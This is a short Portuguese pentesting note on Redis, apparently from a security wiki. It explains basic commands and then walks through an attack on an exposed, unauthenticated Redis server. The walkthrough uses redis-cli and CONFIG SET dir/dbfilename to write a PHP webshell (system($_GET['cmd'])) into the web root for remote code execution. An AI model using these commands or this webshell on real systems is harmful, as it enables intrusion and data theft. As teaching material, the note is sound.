---
description: REDIS Remote Dictionary Server
---

# SSRF - REDIS

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption><p>Redis é um armazenamento de estrutura de dados de chave-valor, em memória, de código aberto, frequentemente usado como cache ou banco de dados de resposta rápida em aplicações web, móveis, jogos, anúncios e IoT. Ele se destaca pela sua velocidade e facilidade de uso, permitindo operações de leitura e gravação em alta velocidade</p></figcaption></figure>

O Redis é um banco de dados chave-valor que permite armazenar dados de forma eficiente. Ele é amplamente utilizado como um armazenamento de dados em memória de alta performance e cache.

O Redis é baseado em texto, o que significa que seus comandos e respostas são em formato de texto.

Com o Redis, você pode:

* Configurar o nome e a localização do arquivo onde o cache será armazenado.
* Gravar dados no banco de dados.

#### Exemplo de uso:

Para criar e recuperar uma chave no Redis:

```
set minha_chave "meu_valor_de_teste"
```

Retorna: `OK`

```
get minha_chave
```

Retorna: `"meu_valor_de_teste"`

***

**ATAQUE EXEMPLO:**<br>

* Descoberta: Um atacante usa ferramentas de varredura para encontrar servidores Redis abertos na internet.
*   Conexão: O atacante simplesmente se conecta ao Redis usando um cliente padrão, como `redis-cli`, sem precisar de credenciais.

    ```
    redis-cli -h [IP_DO_SERVIDOR_REDIS]
    ```
* Exploração: Uma vez conectado, o atacante tem controle total. Eles podem:
  * Ler Dados: Usar `GET [chave]` para roubar informações sensíveis, como sessões de usuário ou tokens de autenticação.
  * Alterar Dados: Usar `SET [chave] [novo_valor]` para manipular informações e causar fraudes ou mudanças no comportamento da aplicação.
  * Execução Remota de Código (RCE) - Cenário Avançado:
    * O atacante pode mudar a pasta onde o Redis salva seus dados (`CONFIG SET dir /var/www/html/`).
    * Mudar o nome do arquivo de dump para um nome de arquivo executável (ex: `CONFIG SET dbfilename shell.php`).
    * Então, o atacante injeta código malicioso (como uma webshell PHP) em uma chave (`SET shell "<?php system($_GET['cmd']); ?>"` ).
    * Quando o Redis faz um `SAVE` dos dados, a webshell é gravada na pasta do servidor web.
    * O atacante acessa a webshell via navegador (`http://[IP_DO_SERVIDOR]/shell.php?cmd=ls`) e executa comandos no servidor.

HACKTRICKS:

{% embed url="https://hacktricks.boitatech.com.br/pentesting/6379-pentesting-redis" %}
